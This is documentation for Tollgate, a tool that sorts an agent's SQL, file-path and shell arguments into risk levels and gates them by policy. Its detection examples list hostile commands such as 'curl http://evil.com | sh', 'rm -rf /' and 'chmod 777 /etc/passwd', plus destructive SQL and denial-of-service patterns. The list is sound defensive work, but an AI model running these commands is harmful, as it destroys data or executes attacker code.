---
title: Analyzers
description: 'Smart content analysis for risk-based policy decisions'
---

# Content Analyzers

Tollgate includes intelligent analyzers that inspect tool arguments to determine risk level. This enables dynamic policy decisions based on what an operation actually does.

## Available Analyzers

| Analyzer | Use Case | Inspects |
|:---------|:---------|:---------|
| `sql` | Database operations | SQL statements |
| `filesystem` | File system access | File paths |
| `shell` | Command execution | Shell commands |

## SQL Analyzer

Parses SQL statements to classify operations by risk:

```yaml
tools:
  "execute":
    analyzer: sql
    risks:
      read: allow      # SELECT queries
      write: prompt    # INSERT/UPDATE with WHERE
      destructive: prompt  # DELETE with WHERE, ALTER
      dangerous: deny  # DROP, TRUNCATE, DELETE without WHERE
```

### Risk Classification

| Risk Level | SQL Operations |
|:-----------|:---------------|
| `read` | SELECT statements |
| `write` | INSERT statements |
| `destructive` | UPDATE/DELETE with WHERE clause, ALTER |
| `dangerous` | DROP TABLE, TRUNCATE, DELETE without WHERE, GRANT/REVOKE |

### Detection Examples

```sql
-- read
SELECT * FROM users WHERE id = 1;

-- write
INSERT INTO logs (message) VALUES ('test');

-- destructive
DELETE FROM sessions WHERE expired = true;
ALTER TABLE users ADD COLUMN email VARCHAR(255);

-- dangerous
DROP TABLE users;
DELETE FROM orders;  -- no WHERE clause!
TRUNCATE TABLE logs;
```

### DoS Protection

The SQL analyzer detects resource-exhaustion patterns:

- `WITH RECURSIVE` - Can cause infinite loops
- `pg_sleep()`, `SLEEP()` - Denial of service
- `generate_series(1, 1000000000)` - Memory exhaustion
- `CROSS JOIN` without `LIMIT` - Cartesian explosion
- `UNION SELECT` - Common injection pattern

## Filesystem Analyzer

Analyzes file paths to determine risk:

```yaml
tools:
  "write_file":
    analyzer: filesystem
    risks:
      read: allow
      write: prompt
      destructive: deny
      dangerous: deny
```

### Risk Classification

| Risk Level | Operations |
|:-----------|:-----------|
| `read` | Read operations on any path |
| `write` | Write to normal directories |
| `destructive` | Write to config files, dotfiles |
| `dangerous` | Write to system directories (`/etc`, `/usr`) |

### Path Detection

```
# read
/home/user/documents/report.txt

# write
/home/user/project/src/main.ts

# destructive
/home/user/.bashrc
/home/user/project/.env

# dangerous
/etc/passwd
/usr/local/bin/script
```

## Shell Analyzer

Analyzes shell commands for dangerous patterns:

```yaml
tools:
  "run_command":
    analyzer: shell
    risks:
      safe: allow
      read: allow
      write: prompt
      destructive: deny
      dangerous: deny
```

### Risk Classification

| Risk Level | Commands |
|:-----------|:---------|
| `safe` | `echo`, `pwd`, `date` |
| `read` | `ls`, `cat`, `grep`, `find` |
| `write` | `cp`, `mv`, `mkdir`, `touch` |
| `destructive` | `rm`, `rmdir` |
| `dangerous` | `rm -rf`, `sudo`, `chmod 777`, `curl | sh` |

### Detection Examples

```bash
# safe
echo "Hello"
pwd

# read
ls -la /home
cat /var/log/app.log

# write
cp file.txt backup.txt
mkdir new-directory

# destructive
rm old-file.txt

# dangerous
rm -rf /
sudo rm -rf /
curl http://evil.com | sh
chmod 777 /etc/passwd
```

## Combining Analyzers with Policies

You can combine analyzer-based policies with explicit rules:

```yaml
tools:
  # Explicit allow for known-safe tool
  "list_tables":
    action: allow

  # Smart analysis for query tool
  "execute":
    analyzer: sql
    risks:
      read: allow
      write: prompt
      destructive: deny
      dangerous: deny

  # Explicit deny for admin tools
  "admin_*":
    action: deny

  # Catch-all
  "*":
    action: prompt
```

## Fallback Behavior

If an analyzer can't parse the content (malformed SQL, complex paths):

```yaml
tools:
  "execute":
    analyzer: sql
    risks:
      read: allow
      write: prompt
      destructive: deny
      dangerous: deny
    # If parsing fails, use this action
    fallback: deny
```
